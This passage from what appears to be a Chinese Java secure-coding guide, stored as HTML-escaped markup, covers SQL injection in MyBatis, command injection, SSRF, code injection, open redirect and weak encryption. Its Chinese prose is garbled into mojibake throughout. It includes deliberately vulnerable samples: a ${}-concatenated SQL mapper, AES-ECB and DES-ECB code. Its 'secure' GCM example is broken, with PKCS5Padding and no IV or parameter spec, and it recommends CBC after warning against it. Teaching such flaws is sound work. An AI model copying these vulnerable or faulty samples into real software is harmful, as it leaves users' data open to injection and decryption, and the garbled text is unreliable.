        SELECT * FROM users WHERE username = &apos;${username}&apos;
    &amp;lt;/select&amp;gt;
&amp;lt;/mapper&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é¿å…ä½¿ç”¨${}å¤„ç†ç”¨æˆ·è¾“å…¥ï¼šå¯¹äºæ‰€æœ‰çš„ç”¨æˆ·è¾“å…¥ï¼Œé¿å…ç›´æ¥é€šè¿‡${}è¿›è¡ŒSQLè¯­å¥ä¸­çš„å˜é‡æ›¿æ¢ã€‚ä½¿ç”¨${}æ—¶ï¼Œåº”ä»…é™äºé‚£äº›ä¸ç”±å¤–éƒ¨ç”¨æˆ·æ§åˆ¶çš„ã€å†…éƒ¨å¯ä¿¡çš„å˜é‡ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨#{}è¿›è¡Œå‚æ•°ç»‘å®šï¼šå¯¹äºéœ€è¦åŠ¨æ€æ’å…¥åˆ°SQLè¯­å¥ä¸­çš„æ•°æ®ï¼Œåº”ä½¿ç”¨Mybatisçš„#{}å ä½ç¬¦ã€‚è¿™ç§æ–¹å¼ä¼šé€šè¿‡é¢„ç¼–è¯‘çš„SQLè¯­å¥å’Œå‚æ•°ç»‘å®šæ¥å¤„ç†å˜é‡ï¼Œæœ‰æ•ˆé¢„é˜²SQLæ³¨å…¥æ”»å‡»ã€‚&lt;/li&gt;
&lt;li&gt;è¾“å…¥éªŒè¯å’Œæ¸…ç†ï¼šåœ¨å°†ç”¨æˆ·è¾“å…¥ç”¨äºæ•°æ®åº“æŸ¥è¯¢ä¹‹å‰ï¼Œåº”å¯¹å…¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ã€‚ç¡®ä¿è¾“å…¥å€¼ç¬¦åˆé¢„æœŸçš„æ ¼å¼ï¼Œå¹¶é™åˆ¶å…¶é•¿åº¦å’ŒèŒƒå›´ï¼Œä»¥å‡å°‘è¢«æ¶æ„åˆ©ç”¨çš„å¯èƒ½æ€§ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨MybatisåŠ¨æ€SQLèƒ½åŠ›ï¼šå½“éœ€è¦æ„å»ºå¤æ‚çš„åŠ¨æ€SQLæ—¶ï¼Œåˆ©ç”¨Mybatisæä¾›çš„åŠ¨æ€SQLåŠŸèƒ½ï¼Œå¦‚&amp;lt;choose&amp;gt;, &amp;lt;if&amp;gt;, &amp;lt;when&amp;gt;, &amp;lt;otherwise&amp;gt;ç­‰æ ‡ç­¾ï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨æ‹¼æ¥SQLå­—ç¬¦ä¸²ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¦‚ä¸‹ä»£ç ä¸­ä½¿ç”¨äº†#{}è¿›è¡Œå‚æ•°æ¥å—ï¼Œé˜²æ­¢sqlæ³¨å…¥çš„äº§ç”Ÿï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;mapper namespace=&quot;com.example.mapper.UserMapper&quot;&amp;gt;
    &amp;lt;select id=&quot;findUserByUsername&quot; parameterType=&quot;string&quot; resultType=&quot;com.example.model.User&quot;&amp;gt;
        SELECT * FROM users WHERE username = #{username}
    &amp;lt;/select&amp;gt;
&amp;lt;/mapper&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;å‘½ä»¤æ³¨å…¥&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°&lt;/strong&gt;ï¼š
å‘½ä»¤æ³¨å…¥æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºå°†ä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„ä¸€éƒ¨åˆ†æ‰§è¡Œæ—¶ã€‚æ”»å‡»è€…é€šè¿‡åœ¨è¾“å…¥ä¸­åµŒå…¥æ¶æ„å‘½ä»¤æˆ–å‚æ•°ï¼Œåˆ©ç”¨è¿™ç§æ¼æ´æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œè¿™å¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€ç³»ç»Ÿè¢«æ§åˆ¶ã€ä»¥åŠå…¶ä»–å®‰å…¨é£é™©ã€‚è¿™ç§æ¼æ´é€šå¸¸å‡ºç°åœ¨åº”ç”¨ç¨‹åºæ²¡æœ‰æ­£ç¡®æ¸…ç†æˆ–éªŒè¯ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå°¤å…¶æ˜¯åœ¨ä½¿ç”¨å¦‚Runtime.exec()ã€ProcessBuilderç­‰åœ¨Javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„APIæ—¶ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é¿å…ç›´æ¥æ‰§è¡Œç”¨æˆ·è¾“å…¥ï¼šå°½å¯èƒ½ä¸è¦ç›´æ¥å°†ç”¨æˆ·è¾“å…¥ç”¨äºç³»ç»Ÿå‘½ä»¤ã€‚å¦‚æœå¿…é¡»è¿™æ ·åšï¼Œç¡®ä¿å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨çš„APIæ›¿ä»£ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼šä½¿ç”¨å‚æ•°åŒ–æˆ–å®‰å…¨çš„APIï¼Œå¦‚Javaä¸­çš„ProcessBuilderï¼Œå¹¶ä¸”å°†å‘½ä»¤å’Œå‚æ•°ä¸¥æ ¼åˆ†ç¦»ã€‚&lt;/li&gt;
&lt;li&gt;ç™½åå•éªŒè¯ï¼šåˆ›å»ºä¸€ä¸ªå…è®¸çš„å‘½ä»¤å’Œå‚æ•°çš„ç™½åå•ï¼Œåªæœ‰ç»è¿‡éªŒè¯çš„å‘½ä»¤å’Œå‚æ•°æ‰èƒ½è¢«æ‰§è¡Œã€‚&lt;/li&gt;
&lt;li&gt;æœ€å°æƒé™åŸåˆ™ï¼šè¿è¡Œåº”ç”¨ç¨‹åºçš„ç³»ç»Ÿç”¨æˆ·åº”å…·æœ‰æœ€å°çš„å¿…è¦æƒé™ï¼Œé˜²æ­¢æ¶æ„å‘½ä»¤å¯¹ç³»ç»Ÿé€ æˆé‡å¤§å½±å“ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨åº“å’Œå·¥å…·ï¼šè€ƒè™‘ä½¿ç”¨ç°æœ‰çš„å®‰å…¨åº“æˆ–å·¥å…·æ¥å¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œå‡å°‘è‡ªè¡Œå®ç°æ¸…ç†å’ŒéªŒè¯çš„é£é™©ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;æœåŠ¡å™¨è¯·æ±‚ä¼ªé€ SSRF&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
æœåŠ¡å™¨è¯·æ±‚ä¼ªé€ ï¼ˆServer-Side Request Forgeryï¼ŒSSRFï¼‰æ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»ï¼Œå…¶ä¸­æ”»å‡»è€…èƒ½å¤Ÿè¿«ä½¿æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºå¯¹æ”»å‡»è€…æŒ‡å®šçš„å†…éƒ¨æˆ–å¤–éƒ¨ç½‘ç»œå‘èµ·è¯·æ±‚ã€‚è¿™ç§æ”»å‡»é€šå¸¸æ˜¯é€šè¿‡åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½é€šè¿‡ç”¨æˆ·æä¾›çš„URLä»æœåŠ¡å™¨ä¸Šä¸‹è½½æ•°æ®æˆ–ä¸ä¹‹äº¤äº’ã€‚å¦‚æœåº”ç”¨ç¨‹åºæœªèƒ½é€‚å½“éªŒè¯ç”¨æˆ·æä¾›çš„URLï¼Œæ”»å‡»è€…å°±å¯èƒ½åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½æ¥è®¿é—®é€šå¸¸æ— æ³•ä»å¤–éƒ¨è®¿é—®çš„æœåŠ¡ï¼Œå¦‚ä½äºé˜²ç«å¢™åé¢çš„å†…éƒ¨æœåŠ¡ï¼Œæˆ–è€…åˆ©ç”¨æœåŠ¡å™¨ä¸å…¶ä»–æœåŠ¡çš„ä¿¡ä»»å…³ç³»æ¥å‘èµ·æ”»å‡»ï¼Œä»è€Œç»•è¿‡IPç™½åå•ã€è¿›è¡Œç«¯å£æ‰«æç­‰ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;éªŒè¯å’Œè¿‡æ»¤è¾“å…¥ï¼šç¡®ä¿æ‰€æœ‰ç”¨æˆ·æä¾›çš„URLéƒ½ç»è¿‡ä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œä»¥ç¡®ä¿å®ƒä»¬ç¬¦åˆé¢„æœŸçš„æ ¼å¼ï¼Œå¹¶ä¸”æŒ‡å‘åˆæ³•çš„ç›®æ ‡åœ°å€ã€‚å¯ä»¥ä½¿ç”¨å…è®¸åˆ—è¡¨æ¥é™åˆ¶å¯è®¿é—®çš„åè®®å’ŒåŸŸåã€‚&lt;/li&gt;
&lt;li&gt;é™åˆ¶è¯·æ±‚ç›®æ ‡ï¼šåº”ç”¨ç¨‹åºåº”é™åˆ¶å¯é€šè¿‡æœåŠ¡å™¨å‘èµ·è¯·æ±‚çš„ç›®æ ‡åœ°å€å’Œç«¯å£ï¼Œé¿å…è®¿é—®æ•æ„Ÿæˆ–ç§æœ‰ç½‘ç»œèµ„æºã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨åº“å¤„ç†URLï¼šä½¿ç”¨å®‰å…¨çš„åº“æ¥å¤„ç†å’Œè§£æURLï¼Œè€Œä¸æ˜¯è‡ªå·±æ„å»ºè¯·æ±‚é€»è¾‘ï¼Œä»¥é¿å…å¼•å…¥å®‰å…¨æ¼æ´ã€‚&lt;/li&gt;
&lt;li&gt;å®æ–½é€‚å½“çš„è¶…æ—¶å’Œé‡è¯•ç­–ç•¥ï¼šä¸ºæ‰€æœ‰å‡ºç«™è¯·æ±‚å®æ–½é€‚å½“çš„è¶…æ—¶å’Œé‡è¯•ç­–ç•¥ï¼Œä»¥é¿å…æœåŠ¡æ‹’ç»ï¼ˆDoSï¼‰æ”»å‡»ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘æ‰€æœ‰å‡ºç«™è¯·æ±‚ï¼Œå¯ä»¥æä¾›é¢å¤–çš„è¿‡æ»¤å’Œå®¡è®¡åŠŸèƒ½ï¼ŒåŒæ—¶éšè—æœåŠ¡å™¨çš„çœŸå®IPåœ°å€ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¦‚ä¸‹åˆ—ä»£ç ä½¿ç”¨isValidUrlæ–¹æ³•æ¥éªŒè¯è¾“å…¥çš„URLæ˜¯å¦åˆæ³•ï¼Œç¡®ä¿åªæœ‰é¢„æœŸçš„ã€å—ä¿¡ä»»çš„åœ°å€å’Œåè®®è¢«å…è®¸ï¼Œä»è€Œé¿å…äº†SSRFæ¼æ´ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SsrfSafeExample {
    public String fetchUrlContent(String urlString) throws Exception {
        URL url = new URL(urlString);

        // éªŒè¯URLæ˜¯å¦ç¬¦åˆé¢„æœŸçš„ç›®æ ‡åœ°å€å’Œåè®®
        if (!isValidUrl(url)) {
            throw new IllegalArgumentException(&quot;Invalid URL provided&quot;);
        }

        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        
        return response.toString();
    }

    private boolean isValidUrl(URL url) {
        // å®ç°URLéªŒè¯é€»è¾‘ï¼Œä¾‹å¦‚æ£€æŸ¥ä¸»æœºåå’Œåè®®æ˜¯å¦åœ¨å…è®¸åˆ—è¡¨ä¸­
        // ç¤ºä¾‹ä»…ä¾›è¯´æ˜ï¼Œå…·ä½“é€»è¾‘æ ¹æ®åº”ç”¨éœ€æ±‚å®šåˆ¶
        String host = url.getHost();
        String protocol = url.getProtocol();
        return &quot;http&quot;.equals(protocol) &amp;amp;&amp;amp; (&quot;example.com&quot;.equals(host) || &quot;api.example.com&quot;.equals(host));
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ä»£ç æ³¨å…¥&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
ä»£ç æ³¨å…¥æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æœªéªŒè¯æˆ–ä¸å®‰å…¨çš„è¾“å…¥ï¼Œç›´æ¥å°†æ¶æ„ä»£ç æ³¨å…¥åº”ç”¨ç¨‹åºå¹¶æ‰§è¡Œçš„æ¼æ´ã€‚è¿™ç§æ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºå°†ç”¨æˆ·æä¾›çš„æ•°æ®ç›´æ¥ä¼ é€’ç»™è§£é‡Šå™¨æˆ–æ‰§è¡Œå™¨ï¼ˆå¦‚&lt;code&gt;eval()&lt;/code&gt;ã€&lt;code&gt;Runtime.exec()&lt;/code&gt;ç­‰ï¼‰ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç æˆ–å‘½ä»¤ã€‚ä»£ç æ³¨å…¥çš„å½±å“åŒ…æ‹¬ç¯¡æ”¹æ•°æ®ã€æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€ç”šè‡³å®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;é¿å…ä½¿ç”¨åŠ¨æ€ä»£ç æ‰§è¡Œ&lt;/strong&gt;ï¼šå°½å¯èƒ½é¿å…ä½¿ç”¨åƒ&lt;code&gt;eval()&lt;/code&gt;ã€&lt;code&gt;Runtime.exec()&lt;/code&gt;æˆ–å…¶ä»–ç±»ä¼¼çš„åŠ¨æ€ä»£ç æ‰§è¡Œæ–¹æ³•ã€‚å¦‚æœå¿…é¡»ä½¿ç”¨ï¼Œç¡®ä¿å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è¾“å…¥éªŒè¯å’Œæ¸…ç†&lt;/strong&gt;ï¼šå¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ï¼Œç¡®ä¿è¾“å…¥æ•°æ®ç¬¦åˆé¢„æœŸçš„æ ¼å¼ï¼Œå¹¶æ‹’ç»æˆ–ç§»é™¤å±é™©çš„å­—ç¬¦æˆ–è¡¨è¾¾å¼ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ä½¿ç”¨å‚æ•°åŒ–è¾“å…¥&lt;/strong&gt;ï¼šåœ¨æ„å»ºå‘½ä»¤æˆ–è„šæœ¬æ—¶ï¼Œä½¿ç”¨å‚æ•°åŒ–æ–¹æ³•ï¼Œé¿å…å°†ç”¨æˆ·è¾“å…¥ç›´æ¥æ‹¼æ¥åˆ°ä»£ç æˆ–å‘½ä»¤ä¸­ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æœ€å°æƒé™åŸåˆ™&lt;/strong&gt;ï¼šç¡®ä¿æ‰§è¡Œä»£ç çš„ç¯å¢ƒå’Œç”¨æˆ·è´¦æˆ·æœ‰æœ€å°çš„æƒé™ï¼Œé˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œé€ æˆæ›´å¤§çš„å½±å“ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å®‰å…¨å¼€å‘æ¡†æ¶&lt;/strong&gt;ï¼šä½¿ç”¨å®‰å…¨çš„å¼€å‘æ¡†æ¶ï¼Œè¿™äº›æ¡†æ¶é€šå¸¸ä¼šæä¾›é˜²å¾¡ä»£ç æ³¨å…¥çš„åŠŸèƒ½å’Œæœºåˆ¶ï¼Œå¦‚Springã€Strutsç­‰ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;å¼€æ”¾é‡å®šå‘&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
å¼€æ”¾é‡å®šå‘æ¼æ´ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿæ„é€ ç‰¹å®šçš„URLï¼Œå°†ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„ç«™ç‚¹ï¼Œä»è€Œè¿›è¡Œé’“é±¼æ”»å‡»ã€åŠ«æŒä¼šè¯æˆ–å…¶ä»–å½¢å¼çš„ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»ã€‚æ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨åº”ç”¨ç¨‹åºä¸­å…è®¸æœªç»éªŒè¯çš„å¤–éƒ¨URLè¿›è¡Œé‡å®šå‘çš„ç‚¹æ¥å®æ–½æ­¤ç±»æ”»å‡»ã€‚è¿™ç§æ¼æ´é€šå¸¸å‡ºç°åœ¨åº”ç”¨ç¨‹åºä½¿ç”¨æœªç»éªŒè¯çš„ç”¨æˆ·è¾“å…¥æ¥åŠ¨æ€æ„é€ é‡å®šå‘URLæ—¶ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä¸¥æ ¼éªŒè¯å’Œç™½åå•&lt;/strong&gt;ï¼šéªŒè¯å’Œé™åˆ¶å…è®¸é‡å®šå‘åˆ°çš„URLï¼Œç¡®ä¿å®ƒä»¬åªèƒ½æŒ‡å‘å—ä¿¡ä»»çš„ç«™ç‚¹æˆ–åº”ç”¨å†…éƒ¨çš„æœ‰æ•ˆURLã€‚å¯ä»¥ä½¿ç”¨ç™½åå•æŠ€æœ¯æ¥é™åˆ¶é‡å®šå‘ç›®æ ‡çš„èŒƒå›´ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;é¿å…ä½¿ç”¨ç”¨æˆ·å¯æ§åˆ¶çš„URL&lt;/strong&gt;ï¼šå°½å¯èƒ½é¿å…ä½¿ç”¨ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥æ¥æ„é€ é‡å®šå‘URLã€‚å¦‚æœå¿…é¡»ä½¿ç”¨ï¼Œç¡®ä¿å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ï¼Œä»¥ç§»é™¤æ¶æ„é‡å®šå‘çš„å¯èƒ½æ€§ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ä½¿ç”¨å®‰å…¨çš„é‡å®šå‘æ–¹æ³•&lt;/strong&gt;ï¼šæ ¹æ®å…·ä½“çš„åº”ç”¨éœ€æ±‚ï¼Œè€ƒè™‘ä½¿ç”¨æ¡†æ¶æˆ–åº“æä¾›çš„å®‰å…¨é‡å®šå‘æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•é€šå¸¸èƒ½å¤Ÿå¤„ç†å®‰å…¨æ€§é—®é¢˜ï¼Œå¦‚Spring MVCä¸­çš„RedirectAttributesæ¥å®‰å…¨åœ°é‡å®šå‘ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è®°å½•å’Œç›‘æ§&lt;/strong&gt;ï¼šè®°å½•æ‰€æœ‰é‡å®šå‘æ“ä½œï¼ŒåŒ…æ‹¬ç›®æ ‡URLå’ŒæºURLï¼Œä»¥ä¾¿åŠæ—¶æ£€æµ‹å’Œå“åº”å¯èƒ½çš„æ¶æ„è¡Œä¸ºã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ•™è‚²å’ŒåŸ¹è®­&lt;/strong&gt;ï¼šæé«˜å¼€å‘å›¢é˜Ÿå¯¹å¼€æ”¾é‡å®šå‘æ¼æ´çš„è®¤è¯†å’Œç†è§£ï¼ŒåŒ…æ‹¬å¦‚ä½•è¯†åˆ«ã€é¢„é˜²å’Œä¿®å¤æ­¤ç±»é—®é¢˜ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;åŠ å¯†ç›¸å…³&lt;/h1&gt;
&lt;h2&gt;ä¸å®‰å…¨çš„åŠ å¯†æ¨¡å¼&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
å—å¯†ç æ“ä½œæ¨¡å¼æ˜¯ä¸€ç§ç®—æ³•ï¼Œç”¨æ¥æè¿°å¦‚ä½•é‡å¤åœ°åº”ç”¨å¯†ç çš„å•å—æ“ä½œï¼Œä»¥å®‰å…¨åœ°è½¬æ¢å¤§äºå—çš„æ•°æ®é‡ã€‚ä¸€äº›æ“ä½œæ¨¡å¼åŒ…æ‹¬ç”µå­ä»£ç æœ¬ (ECB)ã€å¯†ç å—é“¾ (CBC)ã€å¯†ç åé¦ˆ (CFB) å’Œè®¡æ•°å™¨ (CTR)ã€‚
ECB æ¨¡å¼æœ¬è´¨ä¸Šè¾ƒå¼±ï¼Œå› ä¸ºå®ƒä¼šå¯¹ç›¸åŒçš„æ˜æ–‡å—ç”Ÿæˆä¸€æ ·çš„å¯†æ–‡ã€‚CBC æ¨¡å¼å®¹æ˜“å—åˆ°å¯†æ–‡å¡«å¡æ”»å‡»ã€‚CTR æ¨¡å¼ç”±äºæ²¡æœ‰è¿™äº›ç¼ºé™·ï¼Œä½¿ä¹‹æˆä¸ºä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚
ä¾‹å¦‚ä»¥ä¸‹ä»£ç ä½¿ç”¨äº†AESçš„ECBåŠ å¯†æ¨¡å¼ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SecretKeySpec key = new SecretKeySpec(keyBytes, &quot;AES&quot;);
Cipher cipher = Cipher.getInstance(&quot;AES/ECB/PKCS7Padding&quot;, &quot;BC&quot;);
cipher.init(Cipher.ENCRYPT_MODE, key);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;
åŠ å¯†å¤§äºå—çš„æ•°æ®æ—¶ï¼Œé¿å…ä½¿ç”¨ ECB å’Œ CBC æ“ä½œæ¨¡å¼ã€‚CBC æ¨¡å¼æ•ˆç‡è¾ƒä½ï¼Œå¹¶ä¸”åœ¨å’Œ SSL ä¸€èµ·ä½¿ç”¨æ—¶ä¼šé€ æˆä¸¥é‡é£é™© [1]ã€‚è¯·æ”¹ç”¨ CCM (Counter with CBC-MAC) æ¨¡å¼ï¼Œæˆ–è€…å¦‚æœæ›´æ³¨é‡æ€§èƒ½ï¼Œåˆ™ä½¿ç”¨ GCMï¼ˆGalois/Counter Modeï¼‰æ¨¡å¼ï¼ˆå¦‚å¯ç”¨ï¼‰ã€‚
å¦‚ä¸‹åˆ—ä»£ç ä½¿ç”¨äº†GCMæ¨¡å¼ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SecretKeySpec key = new SecretKeySpec(keyBytes, &quot;AES&quot;);
Cipher cipher = Cipher.getInstance(&quot;AES/GCM/PKCS5Padding&quot;, &quot;BC&quot;);
cipher.init(Cipher.ENCRYPT_MODE, key);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ä¸å®‰å…¨çš„åŠ å¯†ç®—æ³•&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
ä½¿ç”¨ä¸å®‰å…¨çš„åŠ å¯†ç®—æ³•å¯ä»¥ä½¿æ•æ„Ÿæ•°æ®å®¹æ˜“è¢«ç ´è§£ï¼Œä»è€Œå¯¼è‡´æ•°æ®æ³„éœ²å’Œå®‰å…¨æ¼æ´ã€‚è¿‡æ—¶çš„æˆ–å¼±çš„åŠ å¯†ç®—æ³•ï¼ˆå¦‚DESå’ŒMD5ï¼‰å› å…¶è¾ƒä½çš„å¯†é’¥é•¿åº¦å’Œå·²çŸ¥çš„å¼±ç‚¹ï¼Œä¸èƒ½æä¾›è¶³å¤Ÿçš„ä¿æŠ¤ï¼Œå®¹æ˜“å—åˆ°æš´åŠ›ç ´è§£æˆ–å¯†ç æ”»å‡»ã€‚æ­¤å¤–ï¼Œä½¿ç”¨ä¸æ­£ç¡®çš„åŠ å¯†æ¨¡å¼å’Œå¡«å……æœºåˆ¶ä¹Ÿå¯èƒ½å¯¼è‡´åŠ å¯†æ–¹æ¡ˆçš„å®‰å…¨æ€§é™ä½ã€‚éšç€è®¡ç®—èƒ½åŠ›çš„å¢å¼ºï¼Œä¸€äº›æ›¾ç»è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ç®—æ³•ç°åœ¨ä¹Ÿå¯èƒ½å˜å¾—å®¹æ˜“è¢«ç ´è§£ã€‚
å¦‚ä¸‹åˆ—ä»£ç ä½¿ç”¨äº†ä¸å®‰å…¨çš„DESç®—æ³•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

public class UnsafeEncryptionExample {
    public static void main(String[] args) throws Exception {
        KeyGenerator keyGenerator = KeyGenerator.getInstance(&quot;DES&quot;);
        SecretKey secretKey = keyGenerator.generateKey();
        
        Cipher cipher = Cipher.getInstance(&quot;DES/ECB/PKCS5Padding&quot;);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        
        String plainText = &quot;Sensitive Information&quot;;
        byte[] encryptedText = cipher.doFinal(plainText.getBytes());
        System.out.println(&quot;Encrypted: &quot; + new String(encryptedText));
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨å¼ºåŠ å¯†ç®—æ³•ï¼šé‡‡ç”¨è¡Œä¸šè®¤å¯çš„å¼ºåŠ å¯†æ ‡å‡†ï¼Œå¦‚AESï¼ˆé«˜çº§åŠ å¯†æ ‡å‡†ï¼‰ï¼Œå¹¶ä½¿ç”¨è¶³å¤Ÿé•¿çš„å¯†é’¥ï¼ˆå¦‚AES-256ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;é€‰æ‹©åˆé€‚çš„åŠ å¯†æ¨¡å¼ï¼šä½¿ç”¨å¦‚CBCï¼ˆå¯†ç å—é“¾æ¥ï¼‰æˆ–GCMï¼ˆåŠ å¯†è®¡æ•°å™¨æ¨¡å¼ï¼‰ç­‰å®‰å…¨çš„åŠ å¯†æ¨¡å¼ï¼Œå®ƒä»¬å¯ä»¥æä¾›å®Œæ•´æ€§å’Œè®¤è¯ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨çš„åº“ï¼šåˆ©ç”¨æˆç†Ÿçš„åŠ å¯†åº“ï¼ˆå¦‚Javaçš„javax.cryptoåº“æˆ–ç¬¬ä¸‰æ–¹åº“Bouncy Castleï¼‰æ¥å®ç°åŠ å¯†å’Œè§£å¯†ï¼Œé¿å…è‡ªå·±å®ç°åŠ å¯†ç®—æ³•ã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸæ›´æ–°å’Œå®¡æŸ¥åŠ å¯†æªæ–½ï¼šéšç€æ–°çš„å®‰å…¨æ¼æ´å’Œæ”»å‡»æ–¹æ³•çš„å‡ºç°ï¼Œå®šæœŸæ›´æ–°å’Œå®¡æŸ¥ä½¿ç”¨çš„åŠ å¯†ç®—æ³•å’Œå®è·µï¼Œç¡®ä¿å®ƒä»¬ç¬¦åˆå½“å‰çš„å®‰å…¨æ ‡å‡†ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¸‹åˆ—ä»£ç ä¸­ä½¿ç”¨äº†AESçš„GCMæ¨¡å¼è¿›è¡ŒåŠ å¯†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.security.SecureRandom;

public class SecureGcmEncryptionExample {
    public static void main(String[] args) throws Exception {
        KeyGenerator keyGenerator = KeyGenerator.getInstance(&quot;AES&quot;);
        keyGenerator.init(256); // ä½¿ç”¨256ä½é•¿çš„å¯†é’¥
        SecretKey secretKey = keyGenerator.generateKey();

